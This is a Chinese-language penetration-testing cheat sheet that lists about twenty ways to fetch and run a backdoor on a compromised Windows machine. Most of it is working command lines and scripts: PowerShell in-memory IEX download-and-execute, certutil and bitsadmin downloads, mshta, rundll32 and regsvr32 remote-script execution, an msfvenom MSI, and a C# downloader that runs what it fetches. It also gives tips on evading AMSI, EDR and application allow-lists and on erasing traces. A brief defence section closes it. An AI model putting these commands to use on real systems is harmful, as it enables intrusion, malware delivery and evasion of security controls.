# Windows 远程文件下载与执行完全指南

> 在获得 Windows Shell 后，如何隐蔽、高效地下载并执行后门文件？本文系统梳理了 **20+ 种实用姿势**，涵盖系统原生工具、脚本语言、白名单利用等，并补充了原理、适用场景、优缺点及防御建议。

---

## 📖 目录

1. [PowerShell](#1-powershell)
2. [Bitsadmin](#2-bitsadmin)
3. [certutil](#3-certutil)
4. [wget](#4-wget)
5. [IPC$ 文件共享](#5-ipc-文件共享)
6. [FTP / TFTP](#6-ftp--tftp)
7. [WinSCP](#7-winscp)
8. [msiexec](#8-msiexec)
9. [IEExec (.NET)](#9-ieexec-net)
10. [mshta](#10-mshta)
11. [rundll32 + JSRat](#11-rundll32--jsrat)
12. [regsvr32 + .sct](#12-regsvr32--sct)
13. [MSXSL.EXE](#13-msxlexe)
14. [pubprn.vbs](#14-pubprnvbs)
15. [VBScript 原生下载](#15-vbscript-原生下载)
16. [Perl / Python / Ruby / PHP 脚本](#16-perl--python--ruby--php-脚本)
17. [Netcat 传输](#17-netcat-传输)
18. [Notepad 诡技](#18-notepad-诡技)
19. [Exe ↔ Hex 转换 (Nishang)](#19-exe--hex-转换-nishang)
20. [CSC 即时编译](#20-csc-即时编译)
21. [补充：实用组合拳 & 检测与防御](#21-补充实用组合拳--检测与防御)

---

## 1. PowerShell

**原理**：利用 .NET 的 `WebClient` 类发起 HTTP/HTTPS 请求，支持文件落地或内存执行。  
**适用**：Windows 7+ 默认安装，Win10/2012 后功能强大。  
**优点**：灵活，可绕过 AMSI（通过混淆）；支持内存执行无落地。  
**缺点**：PowerShell 日志（ScriptBlock、Module）易被蓝队捕获；部分环境禁用。

```powershell
# 下载到本地
powershell (new-object System.Net.WebClient).DownloadFile('http://server/evil.exe', 'evil.exe')

# 内存加载执行（无文件落地）
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://server/evil.ps1'))"
```

> **补充**：可结合 `-EncodedCommand` 进行 Base64 编码绕过检测。

---

## 2. Bitsadmin

**原理**：Windows 后台智能传输服务（BITS）——系统自带，用于异步、断点续传下载。  
**适用**：几乎所有 Windows 版本。  
**优点**：支持代理、带宽限制，不易被普通网络监控识别为恶意。  
**缺点**：需要管理员权限创建任务（部分版本）；下载速度慢。

```cmd
bitsadmin /transfer mytask http://server/evil.exe C:\temp\evil.exe
```

> **补充**：BITS 任务会持久化在系统队列中，可用 `bitsadmin /list` 查看，`/cancel` 删除。

---

## 3. certutil

**原理**：证书服务工具，但支持从 URL 下载文件并缓存。  
**适用**：Windows XP ~ 11 均内置。  
**优点**：几乎全版本通用，命令简单。  
**缺点**：下载内容会留下缓存文件，需手动清理；部分杀软将其标记为可疑。

```cmd
# 下载
certutil -urlcache -split -f http://server/evil.exe evil.exe

# 删除缓存（重要！）
certutil -urlcache -split -f http://server/evil.exe delete
```

> **补充**：缓存目录在 `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`，可脚本批量删除。

---

## 4. wget

**原理**：第三方 GNU 工具，需上传 `wget.exe` 到目标。  
**适用**：自带或上传后使用。  
**优点**：功能强大，支持递归、代理、POST 等。  
**缺点**：非系统原生，需额外落地，增加暴露风险。

```cmd
wget -O evil.exe http://server/evil.exe
```

> **补充**：也可使用 `curl`（Windows 10 1803+ 内置）——`curl -o evil.exe http://server/evil.exe`。

---

## 5. IPC$ 文件共享

**原理**：利用 SMB 协议，通过 `net use` 建立 IPC 连接，然后 `copy` 文件。  
**适用**：内网环境，已知凭据。  
**优点**：速度极快，协议内网常用，不易被边界设备拦截。  
**缺点**：需要账号密码；防火墙可能阻止 445 端口。

```cmd
net use \\192.168.1.100\ipc$ /user:admin "P@ssw0rd"
copy \\192.168.1.100\c$\share\evil.exe .\
```

> **补充**：也可反向操作——将本地文件复制到远程共享。

---

## 6. FTP / TFTP

**原理**：使用 FTP 或 TFTP 协议从远程服务器获取文件。  
**适用**：内网存在 FTP/TFTP 服务时。  
**优点**：TFTP 无认证，简单；FTP 支持认证。  
**缺点**：交互式命令需脚本化；TFTP 基于 UDP 不可靠，且只能下载（不能上传）。

**FTP 批处理脚本**（创建 `ftp.txt`）：
```txt
open 192.168.1.100
username
password
binary
get evil.exe
quit
```
执行：`ftp -s:ftp.txt`

**TFTP**：
```cmd
tftp -i 192.168.1.100 GET evil.exe C:\temp\evil.exe
```

---

## 7. WinSCP

**原理**：第三方 SFTP/SCP 客户端，支持命令行自动化。  
**适用**：已部署 WinSCP 或可上传其可执行文件。  
**优点**：支持 SSH 加密传输，适合外网。  
**缺点**：非原生，体积较大。

```cmd
winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://user:pass@host:22" "get /remote/evil.exe C:\local\" "exit"
```

---

## 8. msiexec

**原理**：Windows Installer 支持从 HTTP 路径直接安装 `.msi` 包，可执行任意命令。  
**适用**：目标可访问外网，且允许安装 MSI。  
**优点**：利用系统白名单程序，部分杀软不拦截。  
**缺点**：需要生成 MSI 包；安装日志可能记录行为。

```bash
# 使用 msfvenom 生成
msfvenom -p windows/exec CMD='calc.exe' -f msi > evil.msi
# 远程执行
msiexec /q /i http://server/evil.msi
```

> **补充**：`/q` 静默安装，`/i` 指定源。也可用 `msiexec /y` 等其他参数。

---

## 9. IEExec (.NET)

**原理**：.NET Framework 的 `IEExec.exe` 可运行 URL 指向的 .NET 可执行程序，绕过部分白名单限制。  
**适用**：安装了 .NET Framework 的 Windows（几乎全版本）。  
**优点**：白名单程序，不易触发警报。  
**缺点**：需先关闭 CAS 策略（`caspol -s off`），易被监控。

```cmd
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\caspol.exe -s off
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\IEExec.exe http://server/evil.exe
```

---

## 10. mshta

**原理**：执行 `.hta`（HTML Application），其中可嵌入 VBScript/JScript，调用 `WScript.Shell` 执行命令。  
**适用**：Windows 默认支持。  
**优点**：可远程加载 HTA，无本地文件落地。  
**缺点**：HTA 执行时会弹出窗口（可最小化隐藏）；被大量用于攻击，很多杀软会拦截。

```cmd
mshta http://server/run.hta
```

`run.hta` 示例：
```html
<script language="VBScript">
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "cmd.exe /c calc.exe", 0, True
self.close
</script>
```

> **补充**：也可使用 `mshta vbscript:Execute(...)` 单行执行。

---

## 11. rundll32 + JSRat

**原理**：通过 `rundll32.exe` 执行 JavaScript，利用 `WinHttp.WinHttpRequest` 下载并 `eval` 执行远程脚本。  
**适用**：Windows 默认。  
**优点**：白名单程序，无文件落地，内存执行。  
**缺点**：代码较长，易被 AMSI 检测；需搭建 C2 服务器（如 JSRat）。

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://server:8888/connect",false);h.Send();eval(h.ResponseText);
```

---

## 12. regsvr32 + .sct

**原理**：`regsvr32` 可通过 `/i` 参数加载远程 `.sct`（脚本组件）文件，执行其中的 JScript/VBScript。  
**适用**：Windows 全系列。  
**优点**：白名单，可绕过应用白名单。  
**缺点**：已被众多 EDR 标记；需构造 `.sct`。

```cmd
regsvr32.exe /u /n /s /i:http://server/file.sct scrobj.dll
```

`file.sct` 示例（弹出计算器）：
```xml
<?XML version="1.0"?>
<scriptlet>
<registration progid="Test" classid="{00000000-0000-0000-0000-000000000000}">
    <script language="JScript">
        <![CDATA[
            new ActiveXObject("WScript.Shell").Run("calc.exe");
        ]]>
    </script>
</registration>
</scriptlet>
```

---

## 13. MSXSL.EXE

**原理**：微软命令行 XSL 处理器，支持在 XSL 中嵌入 JScript，从而执行命令。  
**适用**：需单独下载 `msxsl.exe`（非原生）。  
**优点**：可用于绕过应用白名单。  
**缺点**：需上传两个文件（XML + XSL）或远程托管。

```cmd
msxsl http://server/demo.xml http://server/exec.xsl
```

`exec.xsl` 中嵌入：
```xml
<msxsl:script language="JScript" implements-prefix="user">
   function xml(nodelist) {
      new ActiveXObject("WScript.Shell").Run("calc.exe");
   }
</msxsl:script>
```

---

## 14. pubprn.vbs

**原理**：Windows 7+ 自带签名 VBS 脚本 `pubprn.vbs`，其会将第二个参数传递给 `GetObject()`，可触发 `script:` 协议加载远程 `.sct` 执行。  
**适用**：Windows 7 ~ 11。  
**优点**：微软签名脚本，可绕过部分 AppLocker。  
**缺点**：需 cscript 执行；参数构造需注意。

```cmd
cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http://server/test.sct
```

---

## 15. VBScript 原生下载

**原理**：使用 `Microsoft.XMLHTTP` 和 `Adodb.Stream` 对象下载文件。  
**适用**：Windows 自带 WSH，无需额外工具。  
**优点**：纯脚本，灵活。  
**缺点**：需要创建 `.vbs` 文件落地（或通过 echo 写入）。

```vbscript
Set args = Wscript.Arguments
Url = "http://server/evil.exe"
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", Url, False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile "evil.exe", 2
end with
```
执行：`cscript download.vbs`

---

## 16. Perl / Python / Ruby / PHP 脚本

如果目标主机安装了这些解释器，即可利用其原生网络库下载。

**Perl**（需 LWP::Simple）：
```perl
use LWP::Simple;
getstore("http://server/evil.exe", "evil.exe");
```

**Python**：
```python
import urllib2
u = urllib2.urlopen('http://server/evil.exe')
open('evil.exe','wb').write(u.read())
```

**Ruby**：
```ruby
require 'net/http'
Net::HTTP.start("server") { |http|
  resp = http.get("/evil.exe")
  open("evil.exe", "wb") { |f| f.write(resp.body) }
}
```

**PHP**：
```php
<?php file_put_contents("evil.exe", file_get_contents("http://server/evil.exe")); ?>
```

---

## 17. Netcat 传输

**原理**：使用 Netcat 在监听端发送文件，目标端接收。  
**适用**：内网已有 nc 或可上传。  
**优点**：无需 HTTP 服务，纯 TCP 传输。  
**缺点**：需要双向连接，防火墙可能拦截。

```bash
# 服务端（攻击机）
cat evil.exe | nc -l 1234

# 客户端（目标机）
nc 攻击机IP 1234 > evil.exe
```

---

## 18. Notepad 诡技

**原理**：在记事本的“打开”对话框中直接输入 URL 或 UNC 路径，可查看/下载文件内容（仅文本）。  
**适用**：交互式会话（RDP 或物理接触）。  
**优点**：无命令行痕迹。  
**缺点**：只能获取文本文件，二进制会乱码；不实用。

---

## 19. Exe ↔ Hex 转换 (Nishang)

**原理**：使用 PowerShell 脚本（Nishang 工具包）将 EXE 转为 Hex 字符串，通过剪贴板复制到目标，再转回 EXE。  
**适用**：无法直接网络下载，但可粘贴文本的环境。  
**优点**：绕过网络限制。  
**缺点**：文件较大时复制困难，需手动操作。

```powershell
# 本地生成 hex
.\ExetoText.ps1 evil.exe evil.txt
# 目标机还原
.\TexttoExe.ps1 evil.txt evil.exe
```

---

## 20. CSC 即时编译

**原理**：利用 .NET 的 C# 编译器 `csc.exe` 将源码编译为可执行文件，源码中可内置下载逻辑。  
**适用**：已安装 .NET Framework。  
**优点**：可动态生成免杀 PE；源码可远程加载。  
**缺点**：编译需一定时间，可能触发文件创建监控。

```cmd
csc.exe /out:C:\temp\evil.exe C:\temp\evil.cs
```

示例 `evil.cs` 下载并执行：
```csharp
using System.Net;
class Program {
    static void Main() {
        WebClient wc = new WebClient();
        wc.DownloadFile("http://server/evil.exe", "evil.exe");
        System.Diagnostics.Process.Start("evil.exe");
    }
}
```

---

## 21. 补充：实用组合拳 & 检测与防御

### 🔥 组合拳推荐（实战常用）
| 场景 | 推荐方式 |
|------|----------|
| 有 PowerShell 且未被严格限制 | 内存加载（IEX + DownloadString） |
| 仅命令行，无 PS | certutil 或 bitsadmin |
| 内网环境，有 SMB 凭据 | IPC$ 复制 |
| 需绕过应用白名单 | regsvr32 / rundll32 / mshta |
| 需持久化下载大文件 | bitsadmin（支持断点续传） |

### 🛡️ 检测与防御建议
- **日志监控**：开启 PowerShell ScriptBlock 日志、Sysmon 进程创建事件（Event ID 1）。
- **网络层面**：限制出口 HTTP/HTTPS 白名单，监控非浏览器进程的 Web 请求。
- **应用白名单**：使用 AppLocker 或 WDAC，限制仅允许签名程序运行。
- **行为分析**：监控 `certutil -urlcache`、`bitsadmin /transfer` 等罕见命令行参数。
- **EDR/AV**：大部分现代 EDR 已能拦截上述多数技巧，需结合混淆和 Living Off the Land 手法。

---

## 📚 参考资料
- 原文：Bypass 公众号《Windows远程文件下载执行的15种姿势》
- 补充材料：Ms08067 安全实验室《收集整理的23种文件下载的方式》
- 微软官方文档：各工具命令行参数

---

> **免责声明**：本文内容仅供安全研究与授权测试使用，请勿用于非法活动。在实际渗透测试中，请务必获得书面授权。

---

**整理完成** ✅ 欢迎收藏、转发，关注公众号「Bypass」获取更多安全干货。